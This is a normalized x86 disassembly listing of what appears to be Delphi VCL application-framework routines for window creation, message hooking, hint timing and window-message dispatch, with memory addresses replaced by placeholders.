cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41a474
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_41a64c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_41a5d0
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_468e08
test al al
je r-xdata
inc esi
sub_469164
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_468770
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_46875c
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_4691bc
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_469164
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_469236
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_469018
pop ecx
push ebp
mov al 0x2
call sub_469018
pop ecx
push ebp
mov al 0x3
call sub_469018
pop ecx
push ebp
mov al 0x4
call sub_469018
pop ecx
push ebp
mov al 0x5
call sub_469018
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403254
retn
sub_469244
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_468dd8
xor eax eax
push ebp
push sub_4692bd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4691bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_468de0
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4692d8
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403fa4
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403ff8
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_469330
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push j_sub_4036f4#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_46b824
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_469384
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_448830
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_46b8a0
sub_4693e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46a928
sub_469424
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_4693e0
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_469384
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_469498
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_4694f4
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_469524
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_46954c
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_4694f4
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_469524
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_469524
sub_46958c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41ffc4
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403578
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46ad0c
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a750
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_42ab20
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_46b4a4
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40cab0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46af04
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40cad8
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408bf0
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_404214
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_46b680
mov eax ebx
call sub_46c094
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_469894
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_469775
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_4035e0
mov ebx edx
mov esi eax
mov eax esi
call sub_46c0a4
mov [ esp + 0x4 ] esi
mov [ esp ] sub_46ad0c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_46af04
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_46b8a0
xor edx edx
mov eax esi
call sub_46b21c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420010
push esi
push sub_469cc8
mov eax esi
call sub_46aaf8
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405a08
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403254
mov eax [ esi + 0x90 ]
call sub_403254
mov eax [ esi + 0x98 ]
call sub_403254
test bl bl
jle r-xdata
call sub_4210ec
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_469894
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_469a35
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469a3c
lea eax [ ebp - 0x2c ]
call sub_403fa4
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_469e14
call sub_421054
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_404464
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406f04
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403fa4
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_46a518
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_46a518
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_469a44
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_468778
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_469aa4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_41a474
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_4507d8
cmp ebx eax
je r-xdata
sub_469b14
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_469aa4
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_41a5d0
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_469c2c
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_41a5d0
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_469cc8
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40cd78
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_468c84
mov eax [ rw-data ]
call sub_4692cc
sub_469d20
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_469d7d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469d84
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_40419c
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_469d8c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_469dc8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46a518
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_469e14
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_46a4ce
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_469cc8
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_46afdc
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_41a5d0
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_4507d8
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46bf58
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_46aaf8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_46aa9c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_4507d8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46a518
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_4692cc
push ebp
call sub_469d8c
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_469d8c
pop ecx
jmp [ eax * 4 + jump_table_469eb8 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_4507d8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46a95c
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_455194
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_469d20
push ebp
call sub_469d8c
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_469d8c
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_469d8c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_41fe24
jmp r-xdata
xor eax eax
call sub_461b54
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_4507d8
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_44b16c
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46a534
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_469d8c
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_4674cc
jmp r-xdata
push ebp
call sub_469d8c
pop ecx
jmp r-xdata
push ebp
call sub_469dc8
pop ecx
jmp r-xdata
push ebp
call sub_469d8c
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_469c2c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46a5e4
jmp r-xdata
jmp r-xdata
call sub_43a9dc
call sub_43aabc
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_469c1c
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_469c2c
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_469c24
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_461a04
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_469d8c
pop ecx
jmp r-xdata
call sub_461ab8
